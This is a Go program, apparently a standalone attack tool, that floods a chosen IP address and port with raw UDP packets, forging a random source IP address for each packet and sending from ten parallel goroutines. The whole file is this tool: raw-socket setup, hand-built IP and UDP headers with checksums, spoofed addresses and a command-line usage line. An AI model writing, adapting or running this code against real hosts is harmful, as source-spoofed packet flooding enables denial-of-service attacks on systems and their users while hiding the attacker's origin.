package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"syscall"
	"time"
)

var (
	portNumber int
	data       string
)

func randomInt(min, max int) int {
	return rand.Intn(max-min+1) + min
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randomInt(0, 255), randomInt(0, 255), randomInt(0, 255), randomInt(0, 255))
}

func udpFlood(targetIP string, portNumber int, stop chan bool, data []byte) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_UDP)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to create socket: %v\n", err)
		os.Exit(1)
	}
	defer syscall.Close(fd)

	// Set the IP_HDRINCL option on the socket
	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		fmt.Fprintf(os.Stderr, "Error setting IP_HDRINCL: %v\n", err)
		os.Exit(1)
	}

	for {
		select {
		case <-stop:
			return
		default:
			// Create UDP header
			udpHeader := make([]byte, 8)
			fillUDPHeader(udpHeader, len(data), portNumber)

			// Create IP header
			ipHeader := make([]byte, 20)
			sourceIP := randomIP()
			fillIPHeader(ipHeader, sourceIP, targetIP, len(udpHeader), len(data))

			// Combine the headers and data
			packet := append(ipHeader, udpHeader...)
			packet = append(packet, data...)

			// Calculate the checksums
			setChecksums(ipHeader, udpHeader, data)

			// Detailed Packet Display
			fmt.Printf("IP Header: %s\n", hex.EncodeToString(ipHeader))
			fmt.Printf("UDP Header: %s\n", hex.EncodeToString(udpHeader))
			fmt.Printf("Data Payload: %s\n", string(data)) // Assuming data is ASCII-readable
			fmt.Printf("UDP Length: %d\n", len(udpHeader)+len(data))

			// Destination address for the packet
			destAddr := syscall.SockaddrInet4{Port: portNumber}
			copy(destAddr.Addr[:], net.ParseIP(targetIP).To4())

			// Send the packet
			fmt.Println("PACKET: " + hex.EncodeToString(packet))
			err = syscall.Sendto(fd, packet, 0, &destAddr)
			if err != nil {
				fmt.Fprintf(os.Stderr, "sendto failed: %v\n", err)
			}
			time.Sleep(time.Second)
		}
	}
}

func fillIPHeader(header []byte, sourceIP, targetIP string, udpHeaderLength, dataLength int) {
	binary.BigEndian.PutUint16(header[0:2], 0x4500)                                // Version, IHL, and TOS
	binary.BigEndian.PutUint16(header[2:4], uint16(20+udpHeaderLength+dataLength)) // Total length
	binary.BigEndian.PutUint16(header[4:6], 0)                                     // ID
	binary.BigEndian.PutUint16(header[6:8], 0)                                     // Flags and Fragment
	header[8] = 64                                                                 // TTL
	header[9] = syscall.IPPROTO_UDP                                                // Protocol
	// Checksum is calculated later

	srcIPBytes := net.ParseIP(sourceIP).To4()
	destIPBytes := net.ParseIP(targetIP).To4()
	copy(header[12:16], srcIPBytes)
	copy(header[16:20], destIPBytes)

	// IP checksum calculation
	binary.BigEndian.PutUint16(header[10:12], 0) // Zero checksum for calculation
	binary.BigEndian.PutUint16(header[10:12], calculateChecksum(header))
}

func fillUDPHeader(header []byte, dataLength, destPort int) {
	binary.BigEndian.PutUint16(header[0:2], uint16(12345))        // Source port
	binary.BigEndian.PutUint16(header[2:4], uint16(destPort))     // Destination port
	binary.BigEndian.PutUint16(header[4:6], uint16(8+dataLength)) // Length
	// Checksum will be set after pseudo header is made
}

func setChecksums(ipHeader, udpHeader, data []byte) {
	// Ensure the IP header checksum is calculated with the checksum field set to zero
	binary.BigEndian.PutUint16(ipHeader[10:12], 0)
	ipChecksum := calculateChecksum(ipHeader)
	binary.BigEndian.PutUint16(ipHeader[10:12], ipChecksum)

	// Create the pseudo-header for UDP checksum calculation
	pseudoHeader := make([]byte, 12)
	copy(pseudoHeader[0:4], ipHeader[12:16])                                                 // Source IP
	copy(pseudoHeader[4:8], ipHeader[16:20])                                                 // Destination IP
	pseudoHeader[8] = 0                                                                      // Placeholder
	pseudoHeader[9] = ipHeader[9]                                                            // Protocol
	binary.BigEndian.PutUint16(pseudoHeader[10:12], binary.BigEndian.Uint16(udpHeader[4:6])) // UDP length

	// Combine pseudo-header, UDP header, and data for checksum calculation
	udpForChecksum := append(pseudoHeader, udpHeader...)
	udpForChecksum = append(udpForChecksum, data...)

	// Set the UDP checksum field to zero before calculation
	binary.BigEndian.PutUint16(udpHeader[6:8], 0)
	udpChecksum := calculateChecksum(udpForChecksum)
	binary.BigEndian.PutUint16(udpHeader[6:8], udpChecksum)
}

func calculateChecksum(data []byte) uint16 {
	var sum uint32

	// Make sure we capture the data length for odd lengths
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}

	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8 // if the length is odd, pad the last byte
	}

	// Add the carry bits
	sum = (sum >> 16) + (sum & 0xffff)
	sum += sum >> 16

	// Return the one's complement of sum
	checksum := uint16(^sum)
	return checksum
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: <program> <destination IP> <port> <data>")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	portNumber, _ = strconv.Atoi(os.Args[2])
	data = os.Args[3]

	// Start the udpFlood goroutine
	stopChan := make(chan bool)
	var wg sync.WaitGroup
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			udpFlood(targetIP, portNumber, stopChan, []byte(data))
		}()
		time.Sleep(time.Second)
	}

	// Close the stop channel to stop the udpFlood goroutine
	close(stopChan)
	wg.Wait()

	fmt.Println("Program completed.")
}
